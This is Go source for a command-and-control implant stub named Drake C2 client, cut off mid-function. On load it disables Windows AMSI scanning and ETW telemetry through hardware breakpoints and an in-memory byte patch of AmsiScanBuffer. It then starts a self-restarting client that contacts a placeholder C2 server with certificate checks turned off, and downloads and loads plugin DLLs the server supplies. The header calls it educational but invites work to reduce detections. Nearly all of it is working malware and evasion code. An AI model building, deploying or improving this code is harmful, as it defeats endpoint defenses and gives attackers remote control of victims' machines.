package main

/*
==========================================================================
                       IMPORTANT NOTE
==========================================================================

I apologize for the current organization of the code. This stub was developed
with a focus on functionality rather than readability or optimal structure.

The evasion methods implemented (AMSI/ETW bypass, etc.)
are BASIC and implemented primarily for EDUCATIONAL purposes.
These methods:

1. Hardware Breakpoints for AMSI/ETW bypass
   - Uses debug registers (Dr0-Dr3) to intercept function calls
   - Basic implementation with KNOWN BUGS:
     * May fail on multi-threaded applications
     * Exception handler may not properly catch all calls
     * Race conditions can occur during handler execution
     * Incomplete register state preservation
   - Can be detected by modern EDRs

2. Direct memory patching of AmsiScanBuffer
   - Alters execution flow with simple byte-patching (JZ -> JNZ)
   - Well-known technique that's easily detectable
   - Will only work effectively on Windows 10, not guaranteed on other versions

All these methods CAN AND SHOULD BE IMPROVED to:
- Reduce detections
- Implement more modern techniques
- Improve error handling
- Organize the code more clearly and modularly

This code is shared as a starting point for research and learning,
not as an example of "best practice" for evasion techniques.

Contributions to improve these techniques are welcome!

==========================================================================
*/

import (
	"C"
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

type Client struct {
	serverURL   string
	authToken   string
	buildID     string
	userAgent   string
	httpClient  *http.Client
	taskHistory map[string]time.Time
}

var (
	globalClient *Client
	initOnce     sync.Once
	isStarted    bool
)

type PluginManager struct {
	loadedPlugins map[string]*syscall.DLL
	pluginCache   map[string][]byte
	tempFiles     map[string]string
	client        *Client
}

type PluginResult struct {
	Success bool   `json:"success"`
	Message string `json:"message"`
	Data    string `json:"data"`
}

type PluginManifest struct {
	Name        string `json:"name"`
	Version     string `json:"version"`
	Description string `json:"description"`
	Commands    []struct {
		Name        string `json:"name"`
		Description string `json:"description"`
		Usage       string `json:"usage"`
		Example     string `json:"example"`
	} `json:"commands"`
}

var pluginManager *PluginManager

const (
	PROCESS_ALL_ACCESS = 0x1F0FFF
	MEM_COMMIT         = 0x1000
	MEM_RESERVE        = 0x2000
	PAGE_READWRITE     = 0x04
	PAGE_EXECUTE_READ  = 0x20
)

const (
	CONTEXT_DEBUG_REGISTERS      = 0x00000010
	EXCEPTION_SINGLE_STEP        = 0x80000004
	EXCEPTION_CONTINUE_EXECUTION = 0xffffffff
	EXCEPTION_CONTINUE_SEARCH    = 0x00000000
	EXCEPTION_EXECUTE_HANDLER    = 0x00000001
	STATUS_SUCCESS               = 0x00000000
	STATUS_ACCESS_VIOLATION      = 0xC0000005
	S_OK                         = 0x00000000
)

const (
	GENERIC_READ           = 0x80000000
	FILE_SHARE_READ        = 0x00000001
	OPEN_EXISTING          = 3
	PAGE_READONLY          = 0x02
	SEC_IMAGE              = 0x1000000
	FILE_MAP_READ          = 0x0004
	PAGE_EXECUTE_READWRITE = 0x40
)

type MODULEINFO struct {
	LpBaseOfDll uintptr
	SizeOfImage uint32
	EntryPoint  uintptr
}

type IMAGE_DOS_HEADER struct {
	E_magic    uint16
	E_cblp     uint16
	E_cp       uint16
	E_crlc     uint16
	E_cparhdr  uint16
	E_minalloc uint16
	E_maxalloc uint16
	E_ss       uint16
	E_sp       uint16
	E_csum     uint16
	E_ip       uint16
	E_cs       uint16
	E_lfarlc   uint16
	E_ovno     uint16
	E_res      [4]uint16
	E_oemid    uint16
	E_oeminfo  uint16
	E_res2     [10]uint16
	E_lfanew   int32
}

type IMAGE_FILE_HEADER struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type IMAGE_OPTIONAL_HEADER64 struct {
	Magic                       uint16
	MajorLinkerVersion          uint8
	MinorLinkerVersion          uint8
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
}

type IMAGE_NT_HEADERS64 struct {
	Signature      uint32
	FileHeader     IMAGE_FILE_HEADER
	OptionalHeader IMAGE_OPTIONAL_HEADER64
}

type IMAGE_SECTION_HEADER struct {
	Name                 [8]uint8
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLinenumbers uint32
	NumberOfRelocations  uint16
	NumberOfLinenumbers  uint16
	Characteristics      uint32
}

type CONTEXT struct {
	P1Home               uintptr
	P2Home               uintptr
	P3Home               uintptr
	P4Home               uintptr
	P5Home               uintptr
	P6Home               uintptr
	ContextFlags         uint32
	MxCsr                uint32
	SegCs                uint16
	SegDs                uint16
	SegEs                uint16
	SegFs                uint16
	SegGs                uint16
	SegSs                uint16
	EFlags               uint32
	Dr0                  uintptr
	Dr1                  uintptr
	Dr2                  uintptr
	Dr3                  uintptr
	Dr6                  uintptr
	Dr7                  uintptr
	Rax                  uintptr
	Rcx                  uintptr
	Rdx                  uintptr
	Rbx                  uintptr
	Rsp                  uintptr
	Rbp                  uintptr
	Rsi                  uintptr
	Rdi                  uintptr
	R8                   uintptr
	R9                   uintptr
	R10                  uintptr
	R11                  uintptr
	R12                  uintptr
	R13                  uintptr
	R14                  uintptr
	R15                  uintptr
	Rip                  uintptr
	FltSave              [512]byte
	VectorRegister       [26][16]byte
	VectorControl        uintptr
	DebugControl         uintptr
	LastBranchToRip      uintptr
	LastBranchFromRip    uintptr
	LastExceptionToRip   uintptr
	LastExceptionFromRip uintptr
}

type EXCEPTION_RECORD struct {
	ExceptionCode        uint32
	ExceptionFlags       uint32
	ExceptionRecord      *EXCEPTION_RECORD
	ExceptionAddress     uintptr
	NumberParameters     uint32
	ExceptionInformation [15]uintptr
}

type EXCEPTION_POINTERS struct {
	ExceptionRecord *EXCEPTION_RECORD
	ContextRecord   *CONTEXT
}

func init() {

	if runtime.GOOS == "windows" {
		fmt.Println("[+] Starting AMSI/ETW Bypass Methods...")
		fmt.Println("[+] Applying BOTH bypass methods simultaneously...")

		fmt.Println("[+] Method 1: Hardware Breakpoint Bypass")
		err1 := setupBypass()
		if err1 != nil {
			fmt.Printf("[-] Hardware Breakpoint Bypass failed: %v\n", err1)
		} else {
			fmt.Println("[+] Hardware Breakpoint Bypass active!")
		}

		fmt.Println("[+] Method 2: Direct Memory Patch Bypass (Main.cpp method)")
		err2 := setupDirectAmsiPatch()
		if err2 != nil {
			fmt.Printf("[-] Direct Memory Patch Bypass failed: %v\n", err2)
		} else {
			fmt.Println("[+] Direct Memory Patch Bypass active!")
		}

		if err1 != nil && err2 != nil {
			fmt.Println("[!] Both bypass methods failed, continuing without bypass...")
		} else if err1 == nil && err2 == nil {
			fmt.Println("[+] SUCCESS: Both bypass methods are active!")
		} else if err1 == nil {
			fmt.Println("[+] SUCCESS: Hardware Breakpoint Bypass is active!")
		} else {
			fmt.Println("[+] SUCCESS: Direct Memory Patch Bypass is active!")
		}

		TsTAmsiBypass()
	} else {
		fmt.Println("[!] Bypass is Windows-only, continuing without it...")
	}

	go autoStart()
}

func NewPluginManager(client *Client) *PluginManager {
	return &PluginManager{
		loadedPlugins: make(map[string]*syscall.DLL),
		pluginCache:   make(map[string][]byte),
		tempFiles:     make(map[string]string),
		client:        client,
	}
}

func (pm *PluginManager) LoadPlugin(pluginName string) error {

	if _, exists := pm.loadedPlugins[pluginName]; exists {
		fmt.Printf("[DEBUG] Plugin %s already loaded\n", pluginName)
		return nil
	}

	var pluginData []byte
	var exists bool
	if pluginData, exists = pm.pluginCache[pluginName]; !exists {
		var err error
		pluginData, err = pm.downloadPlugin(pluginName)
		if err != nil {
			return fmt.Errorf("failed to download plugin %s: %v", pluginName, err)
		}
		pm.pluginCache[pluginName] = pluginData
	}

	dll, err := pm.loadDLLFromMemory(pluginData)
	if err != nil {
		return fmt.Errorf("failed to load plugin %s: %v", pluginName, err)
	}

	pm.loadedPlugins[pluginName] = dll
	fmt.Printf("[DEBUG] Plugin %s loaded successfully\n", pluginName)
	return nil
}

func (pm *PluginManager) ExecutePlugin(pluginName, command string) (string, error) {

	if err := pm.LoadPlugin(pluginName); err != nil {
		return "", err
	}

	dll, exists := pm.loadedPlugins[pluginName]
	if !exists {
		return "", fmt.Errorf("plugin %s not loaded", pluginName)
	}

	executeProc, err := dll.FindProc("Execute")
	if err != nil {
		return "", fmt.Errorf("Execute function not found in plugin %s: %v", pluginName, err)
	}

	commandBytes := append([]byte(command), 0)
	commandPtr := uintptr(unsafe.Pointer(&commandBytes[0]))

	ret, _, _ := executeProc.Call(commandPtr)
	if ret == 0 {
		return "", fmt.Errorf("plugin %s could not handle command: %s", pluginName, command)
	}

	return pm.getPluginResult(dll)
}

func (pm *PluginManager) getPluginResult(dll *syscall.DLL) (string, error) {
	getResultProc, err := dll.FindProc("GetResult")
	if err != nil {
		return "", fmt.Errorf("GetResult function not found: %v", err)
	}

	ret, _, _ := getResultProc.Call()
	if ret == 0 {
		return "", nil
	}

	var result strings.Builder
	ptr := ret
	for i := 0; i < 1024; i++ {
		b := *(*byte)(unsafe.Pointer(ptr))
		if b == 0 {
			break
		}
		result.WriteByte(b)
		ptr++
	}

	return result.String(), nil
}

func (pm *PluginManager) downloadPlugin(pluginName string) ([]byte, error) {
	req, err := pm.client.createRequest("GET", fmt.Sprintf("/plugin/%s", pluginName), nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %v", err)
	}

	resp, err := pm.client.httpClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("failed to download plugin: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("server returned status %d", resp.StatusCode)
	}

	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read plugin data: %v", err)
	}

	fmt.Printf("[DEBUG] Downloaded plugin %s (%d bytes)\n", pluginName, len(data))
	return data, nil
}

func (pm *PluginManager) loadDLLFromMemory(data []byte) (*syscall.DLL, error) {

	tempDir := os.TempDir()
	tempName := fmt.Sprintf("plugin_%d_%d.dll", time.Now().UnixNano(), os.Getpid())
	tempPath := filepath.Join(tempDir, tempName)

	err := os.WriteFile(tempPath, data, 0644)
	if err != nil {
		return nil, fmt.Errorf("failed to write plugin data: %v", err)
	}

	time.Sleep(50 * time.Millisecond)

	dll, err := syscall.LoadDLL(tempPath)
	if err != nil {
		os.Remove(tempPath)
		return nil, fmt.Errorf("failed to load DLL: %v", err)
	}

	go func() {
		time.Sleep(5 * time.Second)
		os.Remove(tempPath)
	}()

	fmt.Printf("[DEBUG] Plugin DLL loaded from: %s\n", tempPath)
	return dll, nil
}

func (pm *PluginManager) ListAvailablePlugins() ([]string, error) {
	req, err := pm.client.createRequest("GET", "/plugins", nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %v", err)
	}

	resp, err := pm.client.httpClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("failed to get plugin list: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("server returned status %d", resp.StatusCode)
	}

	var plugins []string
	if err := json.NewDecoder(resp.Body).Decode(&plugins); err != nil {
		return nil, fmt.Errorf("failed to decode plugin list: %v", err)
	}

	return plugins, nil
}

func (pm *PluginManager) UnloadPlugin(pluginName string) error {
	if dll, exists := pm.loadedPlugins[pluginName]; exists {
		dll.Release()
		delete(pm.loadedPlugins, pluginName)
		fmt.Printf("[DEBUG] Plugin %s unloaded\n", pluginName)
	}
	return nil
}

func (pm *PluginManager) UnloadAllPlugins() {
	for name, dll := range pm.loadedPlugins {
		dll.Release()
		fmt.Printf("[DEBUG] Plugin %s unloaded\n", name)
	}
	pm.loadedPlugins = make(map[string]*syscall.DLL)
}

func getProcessName() string {
	executable, err := os.Executable()
	if err != nil {
		return "unknown"
	}
	return filepath.Base(executable)
}

var (
	amsiAddress          uintptr
	etwAddress           uintptr
	hardwareBypassActive bool
	directPatchActive    bool
)

func HwbpEngineBreakpoint(position uint32, function uintptr) bool {

	ntdllDll, err := syscall.LoadDLL("ntdll.dll")
	if err != nil {
		fmt.Printf("[-] Failed to load ntdll.dll: %v\n", err)
		return false
	}

	kernel32Dll, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		fmt.Printf("[-] Failed to load kernel32.dll: %v\n", err)
		return false
	}

	ntGetContextThreadProc, err := ntdllDll.FindProc("NtGetContextThread")
	if err != nil {
		fmt.Printf("[-] Failed to find NtGetContextThread: %v\n", err)
		return false
	}

	ntSetContextThreadProc, err := ntdllDll.FindProc("NtSetContextThread")
	if err != nil {
		fmt.Printf("[-] Failed to find NtSetContextThread: %v\n", err)
		return false
	}

	getCurrentThreadProc, err := kernel32Dll.FindProc("GetCurrentThread")
	if err != nil {
		fmt.Printf("[-] Failed to find GetCurrentThread: %v\n", err)
		return false
	}

	context := CONTEXT{}
	context.ContextFlags = CONTEXT_DEBUG_REGISTERS

	currentThread, _, _ := getCurrentThreadProc.Call()
	ret, _, _ := ntGetContextThreadProc.Call(currentThread, uintptr(unsafe.Pointer(&context)))
	if ret != 0 {
		fmt.Println("[-] NtGetContextThread failed")
		return false
	}

	if function != 0 {
		switch position {
		case 0:
			context.Dr0 = function
		case 1:
			context.Dr1 = function
		case 2:
			context.Dr2 = function
		case 3:
			context.Dr3 = function
		}

		context.Dr7 &= ^(3 << (16 + 4*position))
		context.Dr7 &= ^(3 << (18 + 4*position))
		context.Dr7 |= 1 << (2 * position)
	} else {
		switch position {
		case 0:
			context.Dr0 = 0
		case 1:
			context.Dr1 = 0
		case 2:
			context.Dr2 = 0
		case 3:
			context.Dr3 = 0
		}
		context.Dr7 &= ^(1 << (2 * position))
	}

	ret, _, _ = ntSetContextThreadProc.Call(currentThread, uintptr(unsafe.Pointer(&context)))
	if ret != 0 {
		fmt.Println("[-] NtSetContextThread failed")
		return false
	}

	return true
}

func HwbpEngineHandler(exceptionInfo *EXCEPTION_POINTERS) uintptr {
	exceptionRecord := exceptionInfo.ExceptionRecord
	context := exceptionInfo.ContextRecord

	if exceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP {

		if exceptionRecord.ExceptionAddress == amsiAddress {

			returnAddress := *(*uintptr)(unsafe.Pointer(context.Rsp))

			scanResultPtr := *(*uintptr)(unsafe.Pointer(context.Rsp + 6*unsafe.Sizeof(uintptr(0))))
			scanResult := (*uint32)(unsafe.Pointer(scanResultPtr))

			*scanResult = 0

			context.Rip = returnAddress
			context.Rsp += unsafe.Sizeof(uintptr(0))
			context.Rax = S_OK

			return EXCEPTION_CONTINUE_EXECUTION
		}

		if exceptionRecord.ExceptionAddress == etwAddress {

			context.Rip = *(*uintptr)(unsafe.Pointer(context.Rsp))
			context.Rsp += unsafe.Sizeof(uintptr(0))
			context.Rax = STATUS_SUCCESS

			return EXCEPTION_CONTINUE_EXECUTION
		}
	}

	return EXCEPTION_CONTINUE_SEARCH
}

func exceptionHandlerWrapper(exceptionInfo uintptr) uintptr {
	return HwbpEngineHandler((*EXCEPTION_POINTERS)(unsafe.Pointer(exceptionInfo)))
}

func stringToCharPtr(s string) uintptr {
	p, err := syscall.BytePtrFromString(s)
	if err != nil {
		return 0
	}
	return uintptr(unsafe.Pointer(p))
}

func loadAmsiLibrary() (uintptr, error) {
	fmt.Println("[+] Attempting to load amsi.dll...")

	kernel32dll, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		return 0, fmt.Errorf("failed to load kernel32.dll: %v", err)
	}
	defer kernel32dll.Release()

	loadLibraryW, err := kernel32dll.FindProc("LoadLibraryW")
	if err != nil {
		return 0, fmt.Errorf("failed to find LoadLibraryW: %v", err)
	}

	approaches := []func() (uintptr, error){

		func() (uintptr, error) {
			dllNameUTF16, err := syscall.UTF16PtrFromString("amsi.dll")
			if err != nil {
				return 0, err
			}
			handle, _, loadErr := loadLibraryW.Call(uintptr(unsafe.Pointer(dllNameUTF16)))
			if handle == 0 {
				return 0, fmt.Errorf("LoadLibraryW failed: %v", loadErr)
			}
			return handle, nil
		},

		func() (uintptr, error) {
			dllNameUTF16, err := syscall.UTF16PtrFromString("C:\\Windows\\System32\\amsi.dll")
			if err != nil {
				return 0, err
			}
			handle, _, loadErr := loadLibraryW.Call(uintptr(unsafe.Pointer(dllNameUTF16)))
			if handle == 0 {
				return 0, fmt.Errorf("LoadLibraryW with full path failed: %v", loadErr)
			}
			return handle, nil
		},

		func() (uintptr, error) {
			dll, err := syscall.LoadDLL("amsi.dll")
			if err != nil {
				return 0, fmt.Errorf("syscall.LoadDLL failed: %v", err)
			}
			return uintptr(dll.Handle), nil
		},
	}

	var lastErr error
	for i, approach := range approaches {
		if handle, err := approach(); err == nil {
			fmt.Printf("[+] amsi.dll loaded successfully using approach %d\n", i+1)
			return handle, nil
		} else {
			lastErr = err
			fmt.Printf("[-] Approach %d failed: %v\n", i+1, err)
		}
	}

	return 0, fmt.Errorf("all approaches failed, last error: %v", lastErr)
}

func setupBypass() error {
	fmt.Println("[+] Setting up AMSI/ETW bypass...")

	obfAmsiScanBuffer := "AmsiScanBuffer"
	obfNtTraceEvent := "NtTraceEvent"

	amsiModule, err := loadAmsiLibrary()
	if err != nil {
		fmt.Printf("[-] Could not load amsi.dll: %v\n", err)
		fmt.Println("[!] Continuing without AMSI bypass...")
	}
	var ntdllModule uintptr

	if dll, err := syscall.LoadDLL("ntdll.dll"); err == nil {
		ntdllModule = uintptr(dll.Handle)
		fmt.Println("[+] ntdll.dll handle obtained via syscall.LoadDLL")
	} else {
		return fmt.Errorf("[-] Failed to get handle for ntdll.dll: %v", err)
	}

	kernel32Dll, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		return fmt.Errorf("[-] Failed to load kernel32.dll: %v", err)
	}

	getProcAddressProc, err := kernel32Dll.FindProc("GetProcAddress")
	if err != nil {
		return fmt.Errorf("[-] Failed to find GetProcAddress: %v", err)
	}

	if amsiModule != 0 {
		amsiScanBufferPtr := stringToCharPtr(obfAmsiScanBuffer)
		if amsiScanBufferPtr == 0 {
			fmt.Println("[-] Failed to convert AmsiScanBuffer string to char pointer")
		} else {
			amsiAddress, _, _ = getProcAddressProc.Call(amsiModule, amsiScanBufferPtr)
			if amsiAddress == 0 {
				fmt.Println("[-] Failed to get address of AmsiScanBuffer")
			} else {
				fmt.Printf("[+] AmsiScanBuffer address: 0x%x\n", amsiAddress)
			}
		}
	}

	ntTraceEventPtr := stringToCharPtr(obfNtTraceEvent)
	if ntTraceEventPtr == 0 {
		return fmt.Errorf("[-] Failed to convert NtTraceEvent string to char pointer")
	}

	etwAddress, _, _ = getProcAddressProc.Call(ntdllModule, ntTraceEventPtr)
	if etwAddress == 0 {
		return fmt.Errorf("[-] Failed to get address of NtTraceEvent")
	}
	fmt.Printf("[+] NtTraceEvent address: 0x%x\n", etwAddress)

	addVectoredExceptionHandlerProc, err := kernel32Dll.FindProc("AddVectoredExceptionHandler")
	if err != nil {
		return fmt.Errorf("[-] Failed to find AddVectoredExceptionHandler: %v", err)
	}

	handlerPtr := syscall.NewCallback(exceptionHandlerWrapper)
	ret, _, _ := addVectoredExceptionHandlerProc.Call(1, handlerPtr)
	if ret == 0 {
		return fmt.Errorf("[-] Failed to register exception handler")
	}
	fmt.Println("[+] Exception handler registered")

	breakpointsSet := 0

	if amsiAddress != 0 {
		if HwbpEngineBreakpoint(0, amsiAddress) {
			fmt.Println("[+] AMSI breakpoint set successfully")
			breakpointsSet++
		} else {
			fmt.Println("[-] Failed to set AMSI breakpoint")
		}
	}

	if HwbpEngineBreakpoint(1, etwAddress) {
		fmt.Println("[+] ETW breakpoint set successfully")
		breakpointsSet++
	} else {
		fmt.Println("[-] Failed to set ETW breakpoint")
	}
	if breakpointsSet == 0 {
		return fmt.Errorf("[-] No breakpoints could be set")
	}

	fmt.Printf("[+] Bypass configured with %d breakpoint(s)\n", breakpointsSet)
	hardwareBypassActive = true
	return nil
}

const (
	AMSI_PATCH_OFFSET = 0x95
	PATCH_BYTE_JZ     = 0x74
	PATCH_BYTE_JNZ    = 0x75
)

func setupDirectAmsiPatch() error {
	fmt.Println("[+] Starting Direct AMSI Memory Patch (Main.cpp method)...")

	kernel32, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		return fmt.Errorf("failed to load kernel32.dll: %v", err)
	}
	defer kernel32.Release()

	ntdll, err := syscall.LoadDLL("ntdll.dll")
	if err != nil {
		return fmt.Errorf("failed to load ntdll.dll: %v", err)
	}
	defer ntdll.Release()

	loadLibraryW, err := kernel32.FindProc("LoadLibraryW")
	if err != nil {
		return fmt.Errorf("failed to find LoadLibraryW: %v", err)
	}
	getProcAddress, err := kernel32.FindProc("GetProcAddress")
	if err != nil {
		return fmt.Errorf("failed to find GetProcAddress: %v", err)
	}

	getCurrentProcess, err := kernel32.FindProc("GetCurrentProcess")
	if err != nil {
		return fmt.Errorf("failed to find GetCurrentProcess: %v", err)
	}

	virtualProtectEx, err := kernel32.FindProc("VirtualProtectEx")
	if err != nil {
		return fmt.Errorf("failed to find VirtualProtectEx: %v", err)
	}

	ntWriteVirtualMemory, err := ntdll.FindProc("NtWriteVirtualMemory")
	if err != nil {
		return fmt.Errorf("failed to find NtWriteVirtualMemory: %v", err)
	}

	amsiDllName, err := syscall.UTF16PtrFromString("amsi.dll")
	if err != nil {
		return fmt.Errorf("failed to convert amsi.dll name: %v", err)
	}

	amsiModule, _, _ := loadLibraryW.Call(uintptr(unsafe.Pointer(amsiDllName)))
	if amsiModule == 0 {
		return fmt.Errorf("failed to load amsi.dll")
	}
	fmt.Println("[+] amsi.dll loaded successfully")

	amsiScanBufferName, err := syscall.BytePtrFromString("AmsiScanBuffer")
	if err != nil {
		return fmt.Errorf("failed to convert AmsiScanBuffer name: %v", err)
	}

	amsiScanBufferAddr, _, _ := getProcAddress.Call(amsiModule, uintptr(unsafe.Pointer(amsiScanBufferName)))
	if amsiScanBufferAddr == 0 {
		return fmt.Errorf("failed to get AmsiScanBuffer address")
	}
	fmt.Printf("[+] AmsiScanBuffer address: 0x%x\n", amsiScanBufferAddr)

	patchAddr := amsiScanBufferAddr + AMSI_PATCH_OFFSET
	fmt.Printf("[+] Patch address: 0x%x (AmsiScanBuffer + 0x95)\n", patchAddr)

	hProcess, _, _ := getCurrentProcess.Call()
	if hProcess == 0 {
		return fmt.Errorf("failed to get current process handle")
	}

	currentByte := *(*byte)(unsafe.Pointer(patchAddr))
	fmt.Printf("[+] Current byte at patch address: 0x%02x\n", currentByte)

	if currentByte != PATCH_BYTE_JZ {
		fmt.Printf("[!] Warning: Expected byte 0x74 (JZ), found 0x%02x. Continuing anyway...\n", currentByte)
	}

	var oldProtect uint32
	regionSize := uintptr(0x1000)

	ret, _, _ := virtualProtectEx.Call(
		hProcess,
		patchAddr,
		regionSize,
		PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return fmt.Errorf("failed to change memory protection with VirtualProtectEx")
	}
	fmt.Printf("[+] Memory protection changed from 0x%x to 0x%x using VirtualProtectEx\n", oldProtect, PAGE_EXECUTE_READWRITE)

	patchByte := byte(PATCH_BYTE_JNZ)
	var bytesWritten uintptr

	status, _, _ := ntWriteVirtualMemory.Call(
		hProcess,
		patchAddr,
		uintptr(unsafe.Pointer(&patchByte)),
		uintptr(1),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)

	if status != 0 {
		return fmt.Errorf("NtWriteVirtualMemory failed with status: 0x%x", status)
	}

	if bytesWritten != 1 {
		return fmt.Errorf("NtWriteVirtualMemory wrote %d bytes, expected 1", bytesWritten)
	}

	fmt.Printf("[+] Patch applied using NtWriteVirtualMemory: 0x%02x -> 0x%02x (JZ -> JNZ)\n", PATCH_BYTE_JZ, PATCH_BYTE_JNZ)

	patchedByte := *(*byte)(unsafe.Pointer(patchAddr))
	if patchedByte != PATCH_BYTE_JNZ {
		return fmt.Errorf("patch verification failed: expected 0x%02x, got 0x%02x", PATCH_BYTE_JNZ, patchedByte)
	}
	fmt.Printf("[+] Patch verification successful: 0x%02x\n", patchedByte)
	var newProtect uint32
	ret, _, _ = virtualProtectEx.Call(
		hProcess,
		patchAddr,
		regionSize,
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&newProtect)),
	)
	if ret == 0 {
		fmt.Println("[!] Warning: Failed to restore original memory protection")
	} else {
		fmt.Printf("[+] Memory protection restored to 0x%x\n", oldProtect)
	}
	fmt.Println("[+] Direct AMSI Memory Patch completed successfully!")
	directPatchActive = true
	return nil
}

func TsTAmsiBypass() {
	fmt.Println("[+] Testing AMSI bypass effectiveness...")

	methodsActive := 0

	if hardwareBypassActive {
		fmt.Println("[+] Method 1 - Hardware Breakpoint Bypass: ACTIVE")
		fmt.Printf("[+] AMSI breakpoint at: 0x%x\n", amsiAddress)
		fmt.Printf("[+] ETW breakpoint at: 0x%x\n", etwAddress)
		methodsActive++
	} else {
		fmt.Println("[-] Method 1 - Hardware Breakpoint Bypass: INACTIVE")
	}

	if directPatchActive {
		fmt.Println("[+] Method 2 - Direct Memory Patch Bypass: ACTIVE")
		kernel32, err := syscall.LoadDLL("kernel32.dll")
		if err == nil {
			defer kernel32.Release()

			loadLibraryW, err := kernel32.FindProc("LoadLibraryW")
			if err == nil {
				getProcAddress, err := kernel32.FindProc("GetProcAddress")
				if err == nil {
					amsiDllName, _ := syscall.UTF16PtrFromString("amsi.dll")
					amsiModule, _, _ := loadLibraryW.Call(uintptr(unsafe.Pointer(amsiDllName)))
					if amsiModule != 0 {
						amsiScanBufferName, _ := syscall.BytePtrFromString("AmsiScanBuffer")
						amsiScanBufferAddr, _, _ := getProcAddress.Call(amsiModule, uintptr(unsafe.Pointer(amsiScanBufferName)))
						if amsiScanBufferAddr != 0 {

							patchAddr := amsiScanBufferAddr + AMSI_PATCH_OFFSET
							currentByte := *(*byte)(unsafe.Pointer(patchAddr))

							if currentByte == PATCH_BYTE_JNZ {
								fmt.Printf("[+] Memory patch verified: 0x%02x (JNZ) at 0x%x\n", currentByte, patchAddr)
							} else {
								fmt.Printf("[!] Memory patch check: 0x%02x (unexpected) at 0x%x\n", currentByte, patchAddr)
							}
						}
					}
				}
			}
		}
		methodsActive++
	} else {
		fmt.Println("[-] Method 2 - Direct Memory Patch Bypass: INACTIVE")
	}

	if methodsActive == 0 {
		fmt.Println("[!] No bypass methods are active")
	} else if methodsActive == 1 {
		fmt.Println("[+] PARTIAL SUCCESS: 1 bypass method is active")
	} else {
		fmt.Println("[+] FULL SUCCESS: Both bypass methods are active!")
	}
}

func autoStart() {
	logPath := "drake_dll_autostart.log"
	if logFile, err := os.Create(logPath); err == nil {
		logFile.WriteString(fmt.Sprintf("[%s] Auto-start init() called\n", time.Now().Format("15:04:05")))
		logFile.Close()
	}

	time.Sleep(2 * time.Second)

	if logFile, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); err == nil {
		logFile.WriteString(fmt.Sprintf("[%s] Starting Drake C2 client (persistent mode)...\n", time.Now().Format("15:04:05")))
		logFile.Close()
	}

	/*
		serverURL := "http://localhost:8080"
		authToken := "87ff374cae"
		buildID := "dr4ke-client-20250613-155340"

		if logFile, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); err == nil {
			logFile.WriteString(fmt.Sprintf("[%s] Creating client for %s\n", time.Now().Format("15:04:05"), serverURL))
			logFile.Close()
		}
	*/

	globalClient = NewClient("URL_REPLACE", "TOKEN_REPLACE", "BUILD_ID_REPLACE")
	isStarted = true

	if logFile, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); err == nil {
		logFile.WriteString(fmt.Sprintf("[%s] Calling client.Run() - will run indefinitely\n", time.Now().Format("15:04:05")))
		logFile.Close()
	}

	if err := globalClient.Run(); err != nil {

		if logFile, err2 := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); err2 == nil {
			logFile.WriteString(fmt.Sprintf("[%s] Unexpected client termination: %v\n", time.Now().Format("15:04:05"), err))
			logFile.WriteString(fmt.Sprintf("[%s] Restarting client...\n", time.Now().Format("15:04:05")))
			logFile.Close()
		}
		autoStart()
	}
}

func NewClient(serverURL, authToken, buildID string) *Client {
	processName := getProcessName()
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}
	client := &Client{
		serverURL:   serverURL,
		authToken:   authToken,
		buildID:     buildID,
		userAgent:   fmt.Sprintf("Dr4ke-Client/%s (%s; %s; %s)", buildID, runtime.GOOS, runtime.GOARCH, processName), // ← MODIFICADA PARA INCLUIR processName
		httpClient:  &http.Client{Transport: tr, Timeout: 30 * time.Second},
		taskHistory: make(map[string]time.Time),
	}

	pluginManager = NewPluginManager(client)

	return client
}

func (c *Client) Run() error {
	for {
		if err := c.runWithReconnect(); err != nil {
